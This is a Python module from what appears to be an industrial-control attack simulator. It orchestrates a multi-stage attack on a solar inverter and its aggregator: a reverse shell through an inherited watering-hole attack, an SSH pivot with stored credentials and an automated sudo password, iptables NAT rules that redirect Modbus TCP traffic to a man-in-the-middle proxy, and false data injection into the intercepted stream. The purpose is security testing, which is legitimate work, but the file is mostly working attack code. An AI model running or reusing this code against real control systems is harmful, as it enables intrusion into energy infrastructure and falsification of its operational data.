"""
InverterPivotAttack module for ADCyder Attack Simulator.

This module implements the Inverter-to-AGX pivot attack that combines watering hole
techniques with Modbus traffic interception and manipulation.

Key Features:
- Inherits SSH-based entry point from WateringHoleAttack
- Implements pivot from inverter to aggregator
- Sets up iptables redirection for Modbus TCP traffic hijacking
- Orchestrates MITM proxy for data manipulation
- Provides cleanup and teardown functionality

Attack Flow:
- Initial compromise via watering hole attack on inverter
- Pivot to aggregator using established SSH session
- Configure iptables rules to redirect Modbus traffic
- Deploy MITM proxy to intercept and modify data streams
- Inject synthetic data while maintaining stealth

Use Cases:
- ICS/SCADA security assessment
- Modbus protocol vulnerability testing
- Data integrity attack simulation
- Network segmentation validation
- Industrial control system resilience testing
"""

import logging
import time
import asyncio
import threading

from typing import Optional, Dict, List, Any
import paramiko

from controller.WateringHoleAttack import WateringHoleAttack
from controller.modbus.ModbusAttack import ModbusAttack
from controller.modbus.modbus_proxy import ModbusMITMProxy
from controller.settings import (
    AGGREGATOR_IP_ADDRESS,
    AGGREGATOR_SSH_USER,
    AGGREGATOR_SSH_PASSWORD,
    MODBUS_PROXY_PORT,
    MODBUS_TARGET_PORT,
)


class InverterPivotAttack(WateringHoleAttack):
    """
    Inverter-to-AGX pivot attack class.

    This attack inherits the SSH-based entry point from WateringHoleAttack
    and extends it to pivot to an aggregator for Modbus traffic manipulation.
    """

    def __init__(self, methodName: str = "runTest", is_helper: bool = False) -> None:
        """Initialize the InverterPivotAttack."""
        super().__init__(methodName, is_helper)

        # Initialize ModbusAttack instance for FDIA methods
        self.modbus_attack = ModbusAttack()
        self.aggregator_ssh_client: Optional[paramiko.SSHClient] = None
        self.modbus_proxy: Optional[ModbusMITMProxy] = None
        self.proxy_thread: Optional[threading.Thread] = None
        self.proxy_loop: Optional[asyncio.AbstractEventLoop] = None
        self.iptables_rules_applied: bool = False

        # Pre-build iptables command strings to ensure consistency
        self.iptables_prerouting_add = (
            f"sudo iptables -t nat -A PREROUTING -p tcp --dport {MODBUS_TARGET_PORT} "
            f"-j REDIRECT --to-port {MODBUS_PROXY_PORT}"
        )

        self.iptables_output_add = (
            f"sudo iptables -t nat -A OUTPUT -p tcp --dport {MODBUS_TARGET_PORT} "
            f"-j REDIRECT --to-port {MODBUS_PROXY_PORT}"
        )

        self.iptables_prerouting_delete = (
            f"sudo iptables -t nat -D PREROUTING -p tcp --dport {MODBUS_TARGET_PORT} "
            f"-j REDIRECT --to-port {MODBUS_PROXY_PORT} 2>/dev/null || true"
        )

        self.iptables_output_delete = (
            f"sudo iptables -t nat -D OUTPUT -p tcp --dport {MODBUS_TARGET_PORT} "
            f"-j REDIRECT --to-port {MODBUS_PROXY_PORT} 2>/dev/null || true"
        )

        self.iptables_prerouting_check = (
            f"sudo iptables -t nat -L PREROUTING -n | grep {MODBUS_TARGET_PORT}"
        )

        self.iptables_output_check = (
            f"sudo iptables -t nat -L OUTPUT -n | grep {MODBUS_TARGET_PORT}"
        )

        # Auto-discovery and FDIA state
        self._discovery_attempted: bool = False
        self._discovery_successful: bool = False
        self._discovered_data_registers: Dict[str, Dict[str, int]] = {}
        self._discovered_controls: Dict[int, Any] = {}

    def run_inverter_pivot_attack(self) -> None:
        """
        Execute the complete inverter pivot attack sequence.

        This method orchestrates the entire attack:
        1. Establish initial foothold via watering hole attack
        2. Pivot from inverter to aggregator
        3. Capture authentic Modbus traffic BEFORE MITM setup
        4. Set up iptables redirection for Modbus traffic
        5. Deploy MITM proxy for data manipulation
        6. Execute FDIA attack using captured baseline data
        """
        logging.info("Starting Inverter-to-AGX pivot attack")

        try:
            # Step 1: Establish initial foothold using parent class functionality
            self.establish_reverse_shell()
            logging.info("Initial reverse shell established on inverter")
        except Exception as e:
            logging.error(f"Failed to establish reverse shell: {e}")
            logging.info(
                "Aborting attack - no cleanup needed as aggregator was not accessed"
            )
            raise RuntimeError(f"MSF session establishment failed: {e}")

        # Step 2: Pivot to aggregator
        self.pivot_to_aggregator()
        logging.info("Successfully pivoted to aggregator")

        # Step 3: Capture authentic traffic BEFORE setting up MITM
        logging.info("Capturing authentic Modbus traffic before MITM setup")
        baseline_data = self.capture_authentic_traffic()
        logging.info("Authentic traffic capture completed")

        # Step 4: Set up traffic redirection
        self.setup_iptables_redirection()
        logging.info("iptables redirection rules configured")

        # Step 5: Deploy MITM proxy
        self.deploy_modbus_proxy()
        logging.info("Modbus MITM proxy deployed")

        # Step 6: Execute FDIA attack sequence using captured baseline
        self.execute_fdia_with_baseline(baseline_data)
        logging.info("FDIA attack sequence completed")

        logging.info("Inverter pivot attack sequence completed successfully")

    def pivot_to_aggregator(self) -> None:
        """
        Pivot from the compromised inverter to the aggregator.

        Uses SSH credentials to establish a connection to the aggregator system
        where Modbus traffic interception will be configured.
        """
        if not all([AGGREGATOR_IP_ADDRESS, AGGREGATOR_SSH_USER]):
            raise ValueError("Aggregator connection parameters not configured")

        if not AGGREGATOR_SSH_PASSWORD:
            raise ValueError("Aggregator authentication credentials not configured")

        try:
            logging.info(
                f"Attempting to pivot to aggregator at {AGGREGATOR_IP_ADDRESS}"
            )

            # Establish SSH connection to aggregator
            self.start_ssh_session(
                str(AGGREGATOR_IP_ADDRESS),
                str(AGGREGATOR_SSH_USER),
                str(AGGREGATOR_SSH_PASSWORD),
                None,  # No keyfile for aggregator
            )

            # Store aggreagtor SSH client separately from the inherited one
            self.aggregator_ssh_client = self.ssh_client

            if not self.validate_ssh_session(self.aggregator_ssh_client):
                raise RuntimeError("Aggregator SSH session validation failed")

            logging.info("Successfully established SSH session with aggregator")

        except Exception as e:
            raise RuntimeError(f"Failed to pivot to aggregator: {str(e)}")

    def _send_sudo_command(self, command: str) -> str:
        """
        Send a sudo command with password handling via SSH.

        This method handles the sudo password prompt that occurs when running
        sudo commands through SSH sessions.
        """
        if not self.ssh_client:
            raise RuntimeError("SSH client not available")

        try:
            logging.info(f"Executing sudo command: {command}")

            # Use exec_command for sudo commands to handle password prompts
            stdin, stdout, stderr = self.ssh_client.exec_command(command, get_pty=True)

            # Send the password for sudo prompt
            password_line = f"{AGGREGATOR_SSH_PASSWORD}\n"
            logging.info(
                f"Sending password for sudo prompt (length: {len(AGGREGATOR_SSH_PASSWORD)} chars)"
            )
            stdin.write(password_line)
            stdin.flush()

            # Give some time for the command to execute
            time.sleep(1)

            # Read the output
            output = stdout.read().decode("utf-8", errors="replace").strip()
            error = stderr.read().decode("utf-8", errors="replace").strip()

            # Log detailed output for debugging (but filter out password)
            filtered_output = output.replace(
                str(AGGREGATOR_SSH_PASSWORD), "***PASSWORD***"
            )
            logging.info(f"Command stdout: '{filtered_output}'")
            if error:
                filtered_error = error.replace(
                    str(AGGREGATOR_SSH_PASSWORD), "***PASSWORD***"
                )
                logging.info(f"Command stderr: '{filtered_error}'")

            # Check for common sudo error patterns
            if "incorrect password" in error.lower():
                raise RuntimeError(
                    f"Sudo password authentication failed for command: {command}"
                )
            elif "command not found" in error.lower():
                raise RuntimeError(f"Command not found: {command}")
            elif (
                error
                and "password" not in error.lower()
                and "[sudo]" not in error
                and "sorry" not in error.lower()
            ):
                logging.warning(f"Unexpected stderr output: {error}")

            return output

        except Exception as e:
            raise RuntimeError(f"Error executing sudo command '{command}': {str(e)}")

    def setup_iptables_redirection(self) -> None:
        """
        Configure iptables rules on the aggregator to redirect Modbus TCP traffic.

        Sets up PREROUTING and OUTPUT rules to redirect traffic on port 502
        to the local proxy server port for interception.
        """
        if not self.aggregator_ssh_client:
            raise RuntimeError("Aggregator SSH session not established")

        try:
            logging.info("Configuring iptables redirection rules")

            # Apply the iptables rules using pre-built command strings
            # Note: We need to temporarily set ssh_client to aggregator_ssh_client
            # since _send_sudo_command uses self.ssh_client
            original_ssh_client = self.ssh_client
            self.ssh_client = self.aggregator_ssh_client

            try:
                # Apply iptables rules with sudo password handling
                logging.info(
                    f"Applying PREROUTING rule: {self.iptables_prerouting_add}"
                )
                prerouting_result = self._send_sudo_command(
                    self.iptables_prerouting_add
                )
                filtered_prerouting_result = prerouting_result.replace(
                    str(AGGREGATOR_SSH_PASSWORD), "***PASSWORD***"
                )
                logging.info(f"PREROUTING rule result: {filtered_prerouting_result}")

                logging.info(f"Applying OUTPUT rule: {self.iptables_output_add}")
                output_result = self._send_sudo_command(self.iptables_output_add)
                filtered_output_result = output_result.replace(
                    str(AGGREGATOR_SSH_PASSWORD), "***PASSWORD***"
                )
                logging.info(f"OUTPUT rule result: {filtered_output_result}")

                # Validate that the rules were actually applied
                self._validate_iptables_rules()

            finally:
                self.ssh_client = original_ssh_client

            self.iptables_rules_applied = True
            logging.info(
                "iptables redirection rules successfully applied and validated"
            )

        except Exception as e:
            raise RuntimeError(f"Failed to configure iptables redirection: {str(e)}")

    def _validate_iptables_rules(self) -> None:
        """
        Validate that the iptables rules were successfully applied.

        Checks both PREROUTING and OUTPUT chains for the expected rules.
        Raises RuntimeError if validation fails.
        """
        try:
            logging.info("Validating iptables rules were applied")

            # Check PREROUTING chain using pre-built command
            prerouting_output = self._send_sudo_command(self.iptables_prerouting_check)

            # Check OUTPUT chain using pre-built command
            output_output = self._send_sudo_command(self.iptables_output_check)

            # Validate PREROUTING rule
            if (
                str(MODBUS_TARGET_PORT) not in prerouting_output
                or str(MODBUS_PROXY_PORT) not in prerouting_output
            ):
                raise RuntimeError(
                    f"PREROUTING rule not found. Output: {prerouting_output}"
                )

            # Validate OUTPUT rule
            if (
                str(MODBUS_TARGET_PORT) not in output_output
                or str(MODBUS_PROXY_PORT) not in output_output
            ):
                raise RuntimeError(f"OUTPUT rule not found. Output: {output_output}")

            logging.info("iptables rules validation successful")
            filtered_prerouting_output = prerouting_output.replace(
                str(AGGREGATOR_SSH_PASSWORD), "***PASSWORD***"
            )
            filtered_output_output = output_output.replace(
                str(AGGREGATOR_SSH_PASSWORD), "***PASSWORD***"
            )
            logging.info(
                f"PREROUTING rule confirmed: {filtered_prerouting_output.strip()}"
            )
            logging.info(f"OUTPUT rule confirmed: {filtered_output_output.strip()}")

        except Exception as e:
            raise RuntimeError(f"iptables rules validation failed: {str(e)}")

    def deploy_modbus_proxy(self) -> None:
        """
        Deploy the Modbus MITM proxy server.

        Creates and starts the ModbusMITMProxy in a separate thread with its own
        event loop to handle asynchronous operations while maintaining compatibility
        with the synchronous attack framework.
        """
        if not self.aggregator_ssh_client:
            raise RuntimeError("Aggregator SSH session not established")

        try:
            logging.info("Deploying Modbus MITM proxy")

            # Create the Modbus MITM proxy instance
            # Note: The proxy will connect to the real inverter (target_host)
            # to fetch authentic data before transitioning to synthetic data
            self.modbus_proxy = ModbusMITMProxy(
                listen_port=MODBUS_PROXY_PORT,
                target_host=str(AGGREGATOR_IP_ADDRESS),  # Connect to the real inverter
                target_port=MODBUS_TARGET_PORT,
            )

            # Create a new event loop for the proxy in a separate thread
            def run_proxy_in_thread():
                """Run the proxy server in its own thread with a new event loop."""
                try:
                    # Create a new event loop for this thread
                    self.proxy_loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(self.proxy_loop)

                    # Start the proxy server
                    self.proxy_loop.run_until_complete(self.modbus_proxy.start_server())

                except Exception as e:
                    logging.error(f"Error in proxy thread: {e}")
                finally:
                    if self.proxy_loop:
                        self.proxy_loop.close()

            # Start the proxy in a daemon thread
            self.proxy_thread = threading.Thread(
                target=run_proxy_in_thread, daemon=True
            )
            self.proxy_thread.start()

            # Give the proxy a moment to start up
            time.sleep(2)

            # Verify the proxy is running
            if self.modbus_proxy and self.modbus_proxy.is_running:
                status = self.modbus_proxy.get_status()
                logging.info(
                    f"Modbus MITM proxy successfully deployed and running on port {status['listen_port']}"
                )
                logging.info(
                    f"Proxy will initially forward authentic data for {self.modbus_proxy.initial_period} seconds"
                )
                logging.info(
                    f"Then transition to synthetic data over {self.modbus_proxy.transition_duration} seconds"
                )
            else:
                raise RuntimeError("Proxy failed to start properly")

        except Exception as e:
            raise RuntimeError(f"Failed to deploy Modbus proxy: {str(e)}")

    def cleanup_iptables_rules(self) -> None:
        """
        Remove the iptables redirection rules from the aggregator.

        This cleanup method ensures that traffic redirection is properly
        removed when the attack is terminated.
        """
        if not self.aggregator_ssh_client or not self.iptables_rules_applied:
            return

        try:
            logging.info("Cleaning up iptables redirection rules")

            # Execute cleanup commands using pre-built command strings
            # Note: We need to temporarily set ssh_client to aggregator_ssh_client
            # since _send_sudo_command uses self.ssh_client
            original_ssh_client = self.ssh_client
            self.ssh_client = self.aggregator_ssh_client

            try:
                # Remove all instances of PREROUTING rules (in case there are duplicates)
                logging.info(
                    f"Removing PREROUTING rule(s): {self.iptables_prerouting_delete}"
                )
                for attempt in range(5):  # Try up to 5 times to remove duplicates
                    prerouting_result = self._send_sudo_command(
                        self.iptables_prerouting_delete
                    )
                    filtered_prerouting_result = prerouting_result.replace(
                        str(AGGREGATOR_SSH_PASSWORD), "***PASSWORD***"
                    )
                    logging.info(
                        f"PREROUTING removal attempt {attempt + 1} result: {filtered_prerouting_result}"
                    )

                    # Check if there are still rules to remove
                    check_result = self._send_sudo_command(
                        self.iptables_prerouting_check
                    )
                    if str(MODBUS_TARGET_PORT) not in check_result:
                        logging.info(
                            f"All PREROUTING rules removed after {attempt + 1} attempts"
                        )
                        break

                # Remove all instances of OUTPUT rules (in case there are duplicates)
                logging.info(f"Removing OUTPUT rule(s): {self.iptables_output_delete}")
                for attempt in range(5):  # Try up to 5 times to remove duplicates
                    output_result = self._send_sudo_command(self.iptables_output_delete)
                    filtered_output_result = output_result.replace(
                        str(AGGREGATOR_SSH_PASSWORD), "***PASSWORD***"
                    )
                    logging.info(
                        f"OUTPUT removal attempt {attempt + 1} result: {filtered_output_result}"
                    )

                    # Check if there are still rules to remove
                    check_result = self._send_sudo_command(self.iptables_output_check)
                    if str(MODBUS_TARGET_PORT) not in check_result:
                        logging.info(
                            f"All OUTPUT rules removed after {attempt + 1} attempts"
                        )
                        break
            finally:
                self.ssh_client = original_ssh_client

            self.iptables_rules_applied = False
            logging.info("iptables redirection rules successfully removed")

        except Exception as e:
            logging.warning(f"Failed to cleanup iptables rules: {str(e)}")

    def _cleanup_iptables_after_proxy_completion(self) -> None:
        """
        Clean up iptables rules after the proxy completes its data transition.

        This method waits for the proxy to complete its full lifecycle
        (authentic data period + transition period) before cleaning up iptables rules.
        """
        if not self.modbus_proxy:
            logging.warning("No proxy instance available for timing coordination")
            self.cleanup_iptables_rules()
            return

        try:
            # Calculate total proxy runtime from the proxy's configuration
            total_duration = (
                self.modbus_proxy.initial_period + self.modbus_proxy.transition_duration
            )

            logging.info(
                f"Waiting {total_duration} seconds for proxy to complete data transition "
                f"({self.modbus_proxy.initial_period}s authentic + "
                f"{self.modbus_proxy.transition_duration}s transition) "
                "before cleaning up iptables rules"
            )

            # Wait for the proxy to complete its full lifecycle
            time.sleep(total_duration)

            # Now clean up the iptables rules
            self.cleanup_iptables_rules()

        except Exception as e:
            logging.warning(f"Error during delayed iptables cleanup: {e}")
            # Fallback to immediate cleanup
            self.cleanup_iptables_rules()

    def tearDown(self) -> None:
        """
        Clean up resources and connections used by the attack.

        This method now properly cleans up iptables rules to ensure the system
        is restored to its original state after the test completes.
        """
        try:
            # Clean up iptables rules to restore system state
            logging.info("Cleaning up iptables rules during tearDown")
            self.cleanup_iptables_rules()

            # Close aggregator SSH connection if it exists
            if (
                self.aggregator_ssh_client
                and self.aggregator_ssh_client != self.ssh_client
            ):
                try:
                    self.aggregator_ssh_client.close()
                except Exception as e:
                    logging.warning(f"Failed to close aggregator SSH connection: {e}")
                finally:
                    self.aggregator_ssh_client = None

            # Stop the proxy if it's still running
            if self.modbus_proxy and self.modbus_proxy.is_running:
                try:
                    logging.info("Stopping Modbus MITM proxy during tearDown")
                    # The proxy will stop when the thread terminates or the event loop closes
                except Exception as e:
                    logging.warning(f"Error stopping proxy during tearDown: {e}")

        except Exception as e:
            logging.warning(f"Error during InverterPivotAttack tearDown: {e}")
        finally:
            # Call parent tearDown to handle inherited cleanup
            super().tearDown()

    def finalize_attack_cleanup(self) -> None:
        """
        Perform final cleanup after data injection is complete.

        This method should be called manually after the data injection phase
        is finished to clean up iptables rules and other persistent artifacts.

        Use this method when you're ready to completely terminate the attack
        and restore the system to its original state.
        """
        logging.info("Performing final attack cleanup after data injection completion")

        # Clean up iptables rules that were left in place during tearDown
        self.cleanup_iptables_rules()

        # Stop the proxy if it's still running
        if self.modbus_proxy and self.modbus_proxy.is_running:
            try:
                # Note: This is a synchronous cleanup, the proxy will stop gracefully
                logging.info("Stopping Modbus MITM proxy")
                # The proxy will stop when the thread terminates or the event loop closes
            except Exception as e:
                logging.warning(f"Error stopping proxy: {e}")

        logging.info("Final attack cleanup completed")

    # ==========================================
    # MODBUS TRAFFIC LISTENING & FDIA
    # ==========================================

    def capture_authentic_traffic(self) -> Dict[str, Any]:
        """
        Capture authentic Modbus traffic before MITM setup.

        This method captures real inverter-aggregator communication
        before any iptables redirection or MITM proxy interference.

        Returns:
            Dictionary containing captured authentic traffic data
        """
        from controller.settings import (
            MODBUS_TRAFFIC_CAPTURE_DURATION,
            MODBUS_TRAFFIC_CAPTURE_MESSAGES,
        )

        logging.info("Starting authentic Modbus traffic capture")

        try:
            # Use configurable duration from settings
            duration = getattr(
                self, "_capture_duration", MODBUS_TRAFFIC_CAPTURE_DURATION
            )

            # Capture traffic using ModbusAttack's enhanced capture method
            # Note: No proxy_instance since we're capturing BEFORE MITM setup
            baseline_data = self.modbus_attack.listen_and_capture_modbus_traffic(
                duration_seconds=duration,
                proxy_instance=None,  # No proxy yet - this is authentic capture
            )

            # Log capture results
            if baseline_data.get("traffic_detected", False):
                logging.info(
                    f"Successfully captured authentic traffic: "
                    f"{len(baseline_data.get('parameters', {}))} parameters detected"
                )
            else:
                logging.warning(
                    "No authentic Modbus traffic detected during capture period. "
                    "Attack will proceed with synthetic baseline."
                )

            return baseline_data

        except Exception as e:
            logging.error(f"Authentic traffic capture failed: {e}")
            # Return empty baseline to allow attack to continue
            return {
                "parameters": {},
                "traffic_detected": False,
                "capture_method": "failed",
                "error": str(e),
            }

    def execute_fdia_with_baseline(self, baseline_data: Dict[str, Any]) -> None:
        """
        Execute FDIA attack using captured baseline data.

        This method replaces the old proxy-based FDIA attack and uses
        the pre-captured authentic baseline data.

        Args:
            baseline_data: Authentic traffic data captured before MITM setup
        """
        logging.info("Starting FDIA attack with pre-captured baseline data")

        try:
            # Verify we have a running proxy for the attack
            if not self.modbus_proxy or not self.modbus_proxy.is_running:
                raise RuntimeError("MITM proxy not available for FDIA execution")

            # Wait for proxy to be fully operational
            initial_wait = 5
            logging.info(
                f"Waiting {initial_wait} seconds for proxy to be fully operational"
            )
            time.sleep(initial_wait)

            # Execute FDIA attack using the pre-captured baseline
            if baseline_data.get("parameters"):
                logging.info("Executing FDIA attack with authentic baseline parameters")
                self.modbus_attack.execute_fdia_attack(baseline_data)
            else:
                logging.warning(
                    "No authentic baseline parameters available. "
                    "Executing FDIA with synthetic baseline for testing."
                )
                # Create synthetic baseline for testing scenarios
                synthetic_baseline = {
                    "parameters": {},
                    "traffic_detected": False,
                    "capture_method": "synthetic",
                }
                self.modbus_attack.execute_fdia_attack(synthetic_baseline)

            logging.info("FDIA attack with baseline data completed successfully")

        except Exception as e:
            logging.error(f"FDIA attack with baseline failed: {e}")
            raise

    def execute_proxy_based_fdia_attack(self) -> None:
        """
        Execute FDIA attack based on traffic intercepted by the MITM proxy.

        This method waits for the proxy to be operational and intercepting traffic,
        then coordinates the FDIA attack to use the intercepted data as baseline.
        This ensures the FDIA only executes after the prerequisite infrastructure
        is in place and actively intercepting Modbus traffic.
        """
        if not self.modbus_proxy:
            raise RuntimeError(
                "Modbus MITM proxy not deployed - cannot execute proxy-based FDIA"
            )

        if not self.modbus_proxy.is_running:
            raise RuntimeError(
                "Modbus MITM proxy not running - cannot execute proxy-based FDIA"
            )

        logging.info("Starting proxy-based FDIA attack sequence")

        try:
            # Wait for proxy to establish initial traffic interception
            initial_wait = 5  # seconds to let proxy start intercepting
            logging.info(
                f"Waiting {initial_wait} seconds for proxy to establish traffic interception"
            )
            time.sleep(initial_wait)

            # Verify proxy is still running and intercepting
            if not self.modbus_proxy.is_running:
                raise RuntimeError("Proxy stopped running during FDIA preparation")

            proxy_status = self.modbus_proxy.get_status()
            logging.info(f"Proxy status: {proxy_status}")

            # Execute enhanced FDIA attack coordinated with proxy operation
            logging.info(
                "Proxy is operational - executing enhanced FDIA attack based on intercepted traffic"
            )

            # Execute enhanced traffic capture with proxy integration
            logging.info("Phase 1: Enhanced baseline traffic capture using proxy data")
            baseline_data = self.modbus_attack.listen_and_capture_modbus_traffic(
                duration_seconds=30, proxy_instance=self.modbus_proxy
            )

            # Check if real traffic was detected
            if not baseline_data.get("traffic_detected", False):
                logging.warning(
                    "No real Modbus traffic detected during capture phase. "
                    "FDIA attack may proceed with limited effectiveness."
                )
                # Still proceed but with warning - this allows testing in environments without real traffic

            if baseline_data.get("parameters"):
                # Execute FDIA attack with captured baseline
                logging.info(
                    "Phase 2: Executing FDIA attack with captured baseline data"
                )
                self.modbus_attack.execute_fdia_attack(baseline_data)
            else:
                logging.warning(
                    "No baseline parameters captured - FDIA attack effectiveness will be limited. "
                    "Proceeding with simulated baseline for testing purposes."
                )
                # Create minimal baseline for testing
                simulated_baseline = {
                    "parameters": {},
                    "traffic_detected": False,
                    "capture_method": "simulated",
                }
                self.modbus_attack.execute_fdia_attack(simulated_baseline)

            logging.info("Proxy-based FDIA attack completed successfully")

        except Exception as e:
            logging.error(f"Proxy-based FDIA attack failed: {e}")
            raise

    def test_inverter_pivot_attack(self) -> None:
        """
        Execute the complete inverter pivot attack sequence.

        This test method serves as the entry point for the unittest discovery
        mechanism used by the Makefile experiment targets.
        """
        self.run_inverter_pivot_attack()
